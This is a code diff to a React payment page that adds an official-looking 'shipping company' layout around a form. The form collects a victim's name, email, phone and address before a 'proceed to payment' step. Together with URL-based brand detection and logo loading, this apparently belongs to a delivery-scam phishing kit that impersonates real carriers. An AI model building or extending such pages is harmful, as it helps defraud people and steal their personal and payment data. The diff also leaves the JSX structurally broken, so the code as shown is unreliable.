@@ -17,6 +17,7 @@ import { designSystem } from "@/lib/designSystem";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
+import ShippingCompanyLayout from "@/components/ShippingCompanyLayout";
 
 const PaymentRecipient = () => {
   const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
@@ -192,7 +193,127 @@ const PaymentRecipient = () => {
         amount={formattedAmount}
       />
 
-      {/* Branded Header */}
+      {/* استخدام ShippingCompanyLayout للصفحات الرسمية */}
+      {companyBranding ? (
+        <ShippingCompanyLayout
+          companyKey={serviceKey}
+          trackingNumber={shippingInfo?.tracking_number as string}
+          amount={formattedAmount}
+          customerName={customerName}
+          serviceType={serviceName}
+        >
+          {/* نموذج إدخال بيانات المستلم داخل التخطيط الرسمي */}
+          <div className="space-y-6">
+            {/* Full Name */}
+            <div>
+              <Label className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: companyBranding.colors.text }}>
+                <User className="w-4 h-4" />
+                الاسم الكامل
+              </Label>
+              <Input
+                value={customerName}
+                onChange={(e) => setCustomerName(e.target.value)}
+                required
+                className="h-14 text-base border-2"
+                style={{ 
+                  borderRadius: '12px', 
+                  borderColor: companyBranding.colors.border || '#E5E7EB',
+                  fontFamily: companyBranding.fonts.arabic
+                }}
+                placeholder="أدخل اسمك الكامل"
+              />
+            </div>
+            
+            {/* Email */}
+            <div>
+              <Label className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: companyBranding.colors.text }}>
+                <Mail className="w-4 h-4" />
+                البريد الإلكتروني
+              </Label>
+              <Input
+                type="email"
+                value={customerEmail}
+                onChange={(e) => setCustomerEmail(e.target.value)}
+                required
+                className="h-14 text-base border-2"
+                style={{ 
+                  borderRadius: '12px', 
+                  borderColor: companyBranding.colors.border || '#E5E7EB',
+                  fontFamily: companyBranding.fonts.arabic
+                }}
+                placeholder="example@email.com"
+              />
+            </div>
+            
+            {/* Phone */}
+            <div>
+              <Label className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: companyBranding.colors.text }}>
+                <Phone className="w-4 h-4" />
+                رقم الجوال
+              </Label>
+              <div className="flex">
+                <span 
+                  className="inline-flex items-center px-4 h-14 rounded-r-lg border-2 border-l-0"
+                  style={{ 
+                    borderColor: companyBranding.colors.border || '#E5E7EB',
+                    backgroundColor: companyBranding.colors.surface || '#F8F9FA',
+                    color: companyBranding.colors.text
+                  }}
+                >
+                  {phoneCode}
+                </span>
+                <Input
+                  type="tel"
+                  value={customerPhone}
+                  onChange={(e) => setCustomerPhone(e.target.value)}
+                  required
+                  className="flex-1 h-14 text-base border-2 rounded-l-lg"
+                  style={{ 
+                    borderRadius: '0 12px 12px 0', 
+                    borderColor: companyBranding.colors.border || '#E5E7EB',
+                    fontFamily: companyBranding.fonts.arabic
+                  }}
+                  placeholder={phonePlaceholder}
+                />
+              </div>
+            </div>
+            
+            {/* Address */}
+            <div>
+              <Label className="flex items-center gap-2 mb-3 text-sm font-bold" style={{ color: companyBranding.colors.text }}>
+                <MapPin className="w-4 h-4" />
+                العنوان
+              </Label>
+              <Input
+                value={residentialAddress}
+                onChange={(e) => setResidentialAddress(e.target.value)}
+                className="h-14 text-base border-2"
+                style={{ 
+                  borderRadius: '12px', 
+                  borderColor: companyBranding.colors.border || '#E5E7EB',
+                  fontFamily: companyBranding.fonts.arabic
+                }}
+                placeholder="المدينة، الحي، الشارع"
+              />
+            </div>
+            
+            {/* Submit Button */}
+            <Button
+              type="submit"
+              onClick={handleProceed}
+              disabled={isSubmitting}
+              className="w-full h-14 text-lg font-bold"
+              style={{
+                background: companyBranding.gradients?.primary || `linear-gradient(135deg, ${companyBranding.colors.primary}, ${companyBranding.colors.secondary})`,
+                borderRadius: '12px',
+                fontFamily: companyBranding.fonts.arabic
+              }}
+            >
+              {isSubmitting ? 'جاري المعالجة...' : 'متابعة للدفع'}
+            </Button>
+          </div>
+        </ShippingCompanyLayout>
+      ) : (
       <div 
         className="sticky top-0 z-50 w-full shadow-lg"
         style={{
@@ -512,25 +633,8 @@ const PaymentRecipient = () => {
             </form>
           </Card>
 
-          {/* Footer */}
-          <div className="mt-8 text-center">
-            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
-              <div className="flex items-center gap-1.5">
-                <Lock className="w-3.5 h-3.5" />
-                <span>SSL Encrypted</span>
-              </div>
-              <span>•</span>
-              <div className="flex items-center gap-1.5">
-                <ShieldCheck className="w-3.5 h-3.5" />
-                <span>Verified</span>
-              </div>
-            </div>
-            <p className="text-xs text-gray-400">
-              © 2025 {serviceName}. جميع الحقوق محفوظة.
-            </p>
-          </div>
-        </div>
-      </div>
+          {/* التصميم القديم للشركات غير المعروفة */}
+      )}
     </>
   );
 };
